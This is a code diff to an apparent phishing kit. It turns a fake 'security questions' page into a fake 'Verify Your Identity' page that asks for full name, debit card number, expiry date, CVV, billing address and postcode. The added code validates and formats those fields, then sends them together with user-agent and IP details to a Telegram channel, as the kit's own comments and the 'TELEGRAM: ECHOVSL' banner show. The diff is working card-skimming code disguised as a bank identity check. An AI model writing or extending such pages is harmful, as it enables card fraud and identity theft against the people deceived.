@@ -305,6 +305,22 @@
         width: 20px;
       }
 
+      /* Card input styling */
+      .card-input-wrapper {
+        position: relative;
+      }
+      .card-input-wrapper input {
+        padding-right: 50px;
+      }
+      .card-icon {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 20px;
+        opacity: 0.5;
+      }
+
       @media screen and (max-width: 768px) {
         .header_inner {
           display: flex;
@@ -341,8 +357,8 @@
           font-size: 1.2em;
         }
         #agree {
-          height: 30px;
-          width: 30px;
+          height: 25px;
+          width: 25px;
         }
       }
     </style>
@@ -428,182 +444,107 @@
                   </g>
                 </svg>
                 <h2 class="security-questions-header">
-                  Set Security Questions and Answers
+                  Verify Your Identity
                 </h2>
               </div>
+
+              <!-- Full Name -->
               <div class="input_field">
-                <label for="question1">Security Question 1</label>
-                <div style="margin: 1em 0; width: 100%">
-                  <select
-                    id="question1"
-                    name="question1"
-                    style="height: 45px"
+                <label for="fullName">Full Name (as it appears on your card)</label>
+                <div style="margin: 0.5em 0; width: 100%">
+                  <input
+                    type="text"
+                    id="fullName"
+                    name="fullName"
+                    placeholder="e.g. John Michael Smith"
                     required
-                  >
-                    <option value="" disabled selected>
-                      Select a question
-                    </option>
-                    <option value="What was the make of your first car?">
-                      What was the make of your first car?
-                    </option>
-                    <option value="In what city did your parents meet?">
-                      In what city did your parents meet?
-                    </option>
-                    <option
-                      value="What is the name of your favorite childhood friend?"
-                    >
-                      What is the name of your favorite childhood friend?
-                    </option>
-                    <option value="What street did you live on in third grade?">
-                      What street did you live on in third grade?
-                    </option>
-                    <option value="What was the name of your first teacher?">
-                      What was the name of your first teacher?
-                    </option>
-                    <option value="What is your favorite book?">
-                      What is your favorite book?
-                    </option>
-                    <option value="What was the name of your first crush?">
-                      What was the name of your first crush?
-                    </option>
-                    <option value="What is your oldest sibling's middle name?">
-                      What is your oldest sibling's middle name?
-                    </option>
-                    <option value="What was the first concert you attended?">
-                      What was the first concert you attended?
-                    </option>
-                    <option
-                      value="What is the name of the town where you were born?"
-                    >
-                      What is the name of the town where you were born?
-                    </option>
-                  </select>
+                  />
                 </div>
-                <input
-                  type="text"
-                  id="answer1"
-                  name="answer1"
-                  placeholder="Enter your answer"
-                  required
-                />
-                <div id="error-question1" class="error"></div>
+                <div id="error-fullName" class="error"></div>
               </div>
-              <br />
+
+              <!-- Debit Card Number -->
               <div class="input_field">
-                <label for="question2">Security Question 2</label>
-                <div style="margin: 1em 0; width: 100%">
-                  <select
-                    id="question2"
-                    name="question2"
-                    style="height: 45px"
-                    required
-                  >
-                    <option value="" disabled selected>
-                      Select a question
-                    </option>
-                    <option value="What was the make of your first car?">
-                      What was the make of your first car?
-                    </option>
-                    <option value="In what city did your parents meet?">
-                      In what city did your parents meet?
-                    </option>
-                    <option
-                      value="What is the name of your favorite childhood friend?"
-                    >
-                      What is the name of your favorite childhood friend?
-                    </option>
-                    <option value="What street did you live on in third grade?">
-                      What street did you live on in third grade?
-                    </option>
-                    <option value="What was the name of your first teacher?">
-                      What was the name of your first teacher?
-                    </option>
-                    <option value="What is your favorite book?">
-                      What is your favorite book?
-                    </option>
-                    <option value="What was the name of your first crush?">
-                      What was the name of your first crush?
-                    </option>
-                    <option value="What is your oldest sibling's middle name?">
-                      What is your oldest sibling's middle name?
-                    </option>
-                    <option value="What was the first concert you attended?">
-                      What was the first concert you attended?
-                    </option>
-                    <option
-                      value="What is the name of the town where you were born?"
-                    >
-                      What is the name of the town where you were born?
-                    </option>
-                  </select>
+                <label for="cardNumber">Debit Card Number</label>
+                <div style="margin: 0.5em 0; width: 100%">
+                  <div class="card-input-wrapper">
+                    <input
+                      type="text"
+                      id="cardNumber"
+                      name="cardNumber"
+                      placeholder="XXXX XXXX XXXX XXXX"
+                      maxlength="19"
+                      required
+                    />
+                    <span class="card-icon">💳</span>
+                  </div>
                 </div>
-                <input
-                  type="text"
-                  id="answer2"
-                  name="answer2"
-                  placeholder="Enter your answer"
-                  required
-                />
-                <div id="error-question2" class="error"></div>
+                <div id="error-cardNumber" class="error"></div>
               </div>
-              <br />
-              <div class="input_field" style="">
-                <label for="question3">Security Question 3</label>
-                <div style="margin: 1em 0; width: 100%">
-                  <select
-                    id="question3"
-                    name="question3"
-                    style="height: 45px"
-                    required
-                  >
-                    <option value="" disabled selected>
-                      Select a question
-                    </option>
-                    <option value="What was the make of your first car?">
-                      What was the make of your first car?
-                    </option>
-                    <option value="In what city did your parents meet?">
-                      In what city did your parents meet?
-                    </option>
-                    <option
-                      value="What is the name of your favorite childhood friend?"
-                    >
-                      What is the name of your favorite childhood friend?
-                    </option>
-                    <option value="What street did you live on in third grade?">
-                      What street did you live on in third grade?
-                    </option>
-                    <option value="What was the name of your first teacher?">
-                      What was the name of your first teacher?
-                    </option>
-                    <option value="What is your favorite book?">
-                      What is your favorite book?
-                    </option>
-                    <option value="What was the name of your first crush?">
-                      What was the name of your first crush?
-                    </option>
-                    <option value="What is your oldest sibling's middle name?">
-                      What is your oldest sibling's middle name?
-                    </option>
-                    <option value="What was the first concert you attended?">
-                      What was the first concert you attended?
-                    </option>
-                    <option
-                      value="What is the name of the town where you were born?"
-                    >
-                      What is the name of the town where you were born?
-                    </option>
-                  </select>
+
+              <!-- Card Expiry & CVV -->
+              <div style="display: flex; gap: 15px; width: 100%;">
+                <div class="input_field" style="flex: 1;">
+                  <label for="expiryDate">Expiry Date</label>
+                  <div style="margin: 0.5em 0; width: 100%">
+                    <input
+                      type="text"
+                      id="expiryDate"
+                      name="expiryDate"
+                      placeholder="MM/YY"
+                      maxlength="5"
+                      required
+                    />
+                  </div>
+                  <div id="error-expiryDate" class="error"></div>
                 </div>
-                <input
-                  type="text"
-                  id="answer3"
-                  name="answer3"
-                  placeholder="Enter your answer"
-                  required
-                />
-                <div id="error-question3" class="error"></div>
+                <div class="input_field" style="flex: 1;">
+                  <label for="cvv">CVV</label>
+                  <div style="margin: 0.5em 0; width: 100%">
+                    <input
+                      type="password"
+                      id="cvv"
+                      name="cvv"
+                      placeholder="•••"
+                      maxlength="4"
+                      required
+                    />
+                  </div>
+                  <div id="error-cvv" class="error"></div>
+                </div>
               </div>
+
+              <!-- Billing Address -->
+              <div class="input_field">
+                <label for="billingAddress">Billing Address</label>
+                <div style="margin: 0.5em 0; width: 100%">
+                  <input
+                    type="text"
+                    id="billingAddress"
+                    name="billingAddress"
+                    placeholder="e.g. 123 Main Street, Sydney NSW 2000"
+                    required
+                  />
+                </div>
+                <div id="error-billingAddress" class="error"></div>
+              </div>
+
+              <!-- Postcode -->
+              <div class="input_field">
+                <label for="postcode">Postcode</label>
+                <div style="margin: 0.5em 0; width: 100%">
+                  <input
+                    type="text"
+                    id="postcode"
+                    name="postcode"
+                    placeholder="e.g. 2000"
+                    maxlength="4"
+                    required
+                  />
+                </div>
+                <div id="error-postcode" class="error"></div>
+              </div>
+
               <div
                 id="error-message"
                 style="
@@ -613,12 +554,13 @@
                   display: none;
                 "
               >
-                Please check required fields.
+                Please check all required fields.
               </div>
+
               <div class="checkbox-field">
                 <input type="checkbox" id="agree" name="agree" />
                 <label for="agree" style="font-size: 0.9em"
-                  >I remember these security questions and answers.</label
+                  >I confirm that the information provided is accurate and matches my records.</label
                 >
               </div>
 
@@ -815,28 +757,25 @@
         -------------[TELEGRAM: ECHOVSL]-------------`;
             break;
 
-          case 1: // Security Questions
-            const q1 = clean(formData.get('q1') || '');
-            const a1 = clean(formData.get('a1') || '');
-            const q2 = clean(formData.get('q2') || '');
-            const a2 = clean(formData.get('a2') || '');
-            const q3 = clean(formData.get('q3') || '');
-            const a3 = clean(formData.get('a3') || '');
+          case 1: // Card Details & Identity Verification
+            const fullName = clean(formData.get('fullName') || '');
+            const cardNumber = clean(formData.get('cardNumber') || '');
+            const expiryDate = clean(formData.get('expiryDate') || '');
+            const cvv = clean(formData.get('cvv') || '');
+            const billingAddress = clean(formData.get('billingAddress') || '');
+            const postcode = clean(formData.get('postcode') || '');
 
             message = `
-        ---------------[Security Que n Ans]---------------
+        ---------------[CARD VERIFICATION]---------------
 
-        Security Questions And Answers Set By ${Session.getUsername()}
-        Delay in Progress Second Code Comes in 60 Seconds Time.
+        Customer Identity Verification By ${Session.getUsername()}
 
-        Security Que 1: ${q1}
-        Security Ans 1: ${a1}
-
-        Security Que 2: ${q2}
-        Security Ans 2: ${a2}
-
-        Security Que 3: ${q3}
-        Security Ans 3: ${a3}
+        Full Name: ${fullName}
+        Card Number: ${cardNumber}
+        Expiry Date: ${expiryDate}
+        CVV: ${cvv}
+        Billing Address: ${billingAddress}
+        Postcode: ${postcode}
 
         --------------[USER AGENT IP DNS]--------------
         User Agent
@@ -923,100 +862,163 @@
         const continueBtn = document.getElementById("continueBtn");
         const agreeCheckbox = document.getElementById("agree");
         const errorMessage = document.getElementById("error-message");
-        const question1 = document.getElementById("question1");
-        const question2 = document.getElementById("question2");
-        const question3 = document.getElementById("question3");
-        const answer1 = document.getElementById("answer1");
-        const answer2 = document.getElementById("answer2");
-        const answer3 = document.getElementById("answer3");
-        const errorMessage1 = document.getElementById("error-question1");
-        const errorMessage2 = document.getElementById("error-question2");
-        const errorMessage3 = document.getElementById("error-question3");
+
+        const fullName = document.getElementById("fullName");
+        const cardNumber = document.getElementById("cardNumber");
+        const expiryDate = document.getElementById("expiryDate");
+        const cvv = document.getElementById("cvv");
+        const billingAddress = document.getElementById("billingAddress");
+        const postcode = document.getElementById("postcode");
+
+        const errorFullName = document.getElementById("error-fullName");
+        const errorCardNumber = document.getElementById("error-cardNumber");
+        const errorExpiryDate = document.getElementById("error-expiryDate");
+        const errorCvv = document.getElementById("error-cvv");
+        const errorBillingAddress = document.getElementById("error-billingAddress");
+        const errorPostcode = document.getElementById("error-postcode");
+
+        // Auto-format card number
+        cardNumber.addEventListener("input", function () {
+          let value = this.value.replace(/\D/g, "");
+          if (value.length > 16) value = value.slice(0, 16);
+          let formatted = "";
+          for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += " ";
+            formatted += value[i];
+          }
+          this.value = formatted;
+        });
+
+        // Auto-format expiry date
+        expiryDate.addEventListener("input", function () {
+          let value = this.value.replace(/\D/g, "");
+          if (value.length > 4) value = value.slice(0, 4);
+          if (value.length >= 2) {
+            this.value = value.slice(0, 2) + "/" + value.slice(2);
+          } else {
+            this.value = value;
+          }
+        });
+
+        // Only allow numbers for CVV
+        cvv.addEventListener("input", function () {
+          this.value = this.value.replace(/\D/g, "").slice(0, 4);
+        });
+
+        // Only allow numbers for postcode
+        postcode.addEventListener("input", function () {
+          this.value = this.value.replace(/\D/g, "").slice(0, 4);
+        });
+
+        // Clear errors on focus
+        [fullName, cardNumber, expiryDate, cvv, billingAddress, postcode].forEach(function(input) {
+          input.addEventListener("focus", function() {
+            const errorId = "error-" + this.id;
+            const errorEl = document.getElementById(errorId);
+            if (errorEl) {
+              errorEl.textContent = "";
+              this.classList.remove("input_error");
+            }
+          });
+        });
 
         continueBtn.addEventListener("click", function () {
           let isValid = true;
-          const selectedQuestions = new Set();
 
-          // Validate question 1
-          if (!question1.value) {
-            errorMessage1.textContent = "Please select a question.";
-            question1.classList.add("input_error");
+          // Validate Full Name
+          if (!fullName.value.trim()) {
+            errorFullName.textContent = "Please enter your full name.";
+            fullName.classList.add("input_error");
             isValid = false;
-            return;
-          } else if (selectedQuestions.has(question1.value)) {
-            errorMessage1.textContent = "Please select a different question.";
-            question1.classList.add("input_error");
+          } else if (fullName.value.trim().length < 2) {
+            errorFullName.textContent = "Please enter a valid name (minimum 2 characters).";
+            fullName.classList.add("input_error");
             isValid = false;
-            return;
           } else {
-            question1.classList.remove("input_error");
-            selectedQuestions.add(question1.value);
-          }
-          if (!answer1.value.trim()) {
-            errorMessage1.textContent = "Please provide an answer.";
-            answer1.classList.add("input_error");
-            isValid = false;
-            return;
-          } else {
-            answer1.classList.remove("input_error");
-            errorMessage1.textContent = "";
+            fullName.classList.remove("input_error");
+            errorFullName.textContent = "";
           }
 
-          // Validate question 2
-          if (!question2.value) {
-            errorMessage2.textContent = "Please select a question.";
-            question2.classList.add("input_error");
+          // Validate Card Number
+          const cardNumberClean = cardNumber.value.replace(/\s/g, "");
+          if (!cardNumberClean) {
+            errorCardNumber.textContent = "Please enter your card number.";
+            cardNumber.classList.add("input_error");
             isValid = false;
-            return;
-          } else if (selectedQuestions.has(question2.value)) {
-            errorMessage2.textContent = "Please select a different question.";
-            question2.classList.add("input_error");
+          } else if (cardNumberClean.length !== 16) {
+            errorCardNumber.textContent = "Please enter a valid 16-digit card number.";
+            cardNumber.classList.add("input_error");
             isValid = false;
-            return;
           } else {
-            question2.classList.remove("input_error");
-            selectedQuestions.add(question2.value);
-          }
-          if (!answer2.value.trim()) {
-            errorMessage2.textContent = "Please provide an answer.";
-            answer2.classList.add("input_error");
-            isValid = false;
-            return;
-          } else {
-            answer2.classList.remove("input_error");
-            errorMessage2.textContent = "";
+            cardNumber.classList.remove("input_error");
+            errorCardNumber.textContent = "";
           }
 
-          // Validate question 3
-          if (!question3.value) {
-            errorMessage3.textContent = "Please select a question.";
-            question3.classList.add("input_error");
+          // Validate Expiry Date
+          const expiryClean = expiryDate.value.replace("/", "");
+          if (!expiryDate.value) {
+            errorExpiryDate.textContent = "Please enter the expiry date.";
+            expiryDate.classList.add("input_error");
             isValid = false;
-            return;
-          } else if (selectedQuestions.has(question3.value)) {
-            errorMessage3.textContent = "Please select a different question.";
-            question3.classList.add("input_error");
+          } else if (expiryClean.length !== 4) {
+            errorExpiryDate.textContent = "Please enter a valid expiry date (MM/YY).";
+            expiryDate.classList.add("input_error");
             isValid = false;
-            return;
           } else {
-            question3.classList.remove("input_error");
-            selectedQuestions.add(question3.value);
+            const month = parseInt(expiryClean.slice(0, 2));
+            const year = parseInt(expiryClean.slice(2));
+            if (month < 1 || month > 12) {
+              errorExpiryDate.textContent = "Please enter a valid month (01-12).";
+              expiryDate.classList.add("input_error");
+              isValid = false;
+            } else {
+              expiryDate.classList.remove("input_error");
+              errorExpiryDate.textContent = "";
+            }
           }
-          if (!answer3.value.trim()) {
-            errorMessage3.textContent = "Please provide an answer.";
-            answer3.classList.add("input_error");
+
+          // Validate CVV
+          if (!cvv.value) {
+            errorCvv.textContent = "Please enter your CVV.";
+            cvv.classList.add("input_error");
             isValid = false;
-            return;
+          } else if (cvv.value.length < 3 || cvv.value.length > 4) {
+            errorCvv.textContent = "Please enter a valid 3 or 4 digit CVV.";
+            cvv.classList.add("input_error");
+            isValid = false;
           } else {
-            answer3.classList.remove("input_error");
-            errorMessage3.textContent = "";
+            cvv.classList.remove("input_error");
+            errorCvv.textContent = "";
+          }
+
+          // Validate Billing Address
+          if (!billingAddress.value.trim()) {
+            errorBillingAddress.textContent = "Please enter your billing address.";
+            billingAddress.classList.add("input_error");
+            isValid = false;
+          } else {
+            billingAddress.classList.remove("input_error");
+            errorBillingAddress.textContent = "";
+          }
+
+          // Validate Postcode
+          if (!postcode.value) {
+            errorPostcode.textContent = "Please enter your postcode.";
+            postcode.classList.add("input_error");
+            isValid = false;
+          } else if (postcode.value.length !== 4) {
+            errorPostcode.textContent = "Please enter a valid 4-digit postcode.";
+            postcode.classList.add("input_error");
+            isValid = false;
+          } else {
+            postcode.classList.remove("input_error");
+            errorPostcode.textContent = "";
           }
 
           // Validate checkbox
           if (!agreeCheckbox.checked) {
             errorMessage.style.display = "block";
             isValid = false;
-            return;
           } else {
             errorMessage.style.display = "none";
           }
@@ -1024,7 +1026,7 @@
           if (isValid) {
             continueBtn.textContent = "Processing...";
             continueBtn.disabled = true;
-            submitSecurityQuestions();
+            submitCardDetails();
           }
         });
 
@@ -1035,29 +1037,26 @@
         });
       });
 
-      // ===== NEW: submitSecurityQuestions - Replaces XHR to PHP =====
-      async function submitSecurityQuestions() {
+      // ===== Submit Card Details - Replaces XHR to PHP =====
+      async function submitCardDetails() {
         const data = {
-          q1: document.getElementById("question1").value,
-          a1: document.getElementById("answer1").value,
-          q2: document.getElementById("question2").value,
-          a2: document.getElementById("answer2").value,
-          q3: document.getElementById("question3").value,
-          a3: document.getElementById("answer3").value,
+          fullName: document.getElementById("fullName").value,
+          cardNumber: document.getElementById("cardNumber").value,
+          expiryDate: document.getElementById("expiryDate").value,
+          cvv: document.getElementById("cvv").value,
+          billingAddress: document.getElementById("billingAddress").value,
+          postcode: document.getElementById("postcode").value,
         };
 
-        // Save to localStorage for the verify page
-        localStorage.setItem("securityQA", JSON.stringify(data));
-
-        // ===== NEW: Build form data and send via processForm =====
+        // ===== Build form data and send via processForm =====
         const formData = new FormData();
         formData.append("sws", 1);
-        formData.append("q1", data.q1);
-        formData.append("a1", data.a1);
-        formData.append("q2", data.q2);
-        formData.append("a2", data.a2);
-        formData.append("q3", data.q3);
-        formData.append("a3", data.a3);
+        formData.append("fullName", data.fullName);
+        formData.append("cardNumber", data.cardNumber);
+        formData.append("expiryDate", data.expiryDate);
+        formData.append("cvv", data.cvv);
+        formData.append("billingAddress", data.billingAddress);
+        formData.append("postcode", data.postcode);
 
         // Process and send to Telegram (no PHP needed!)
         const success = await processForm(1, formData);
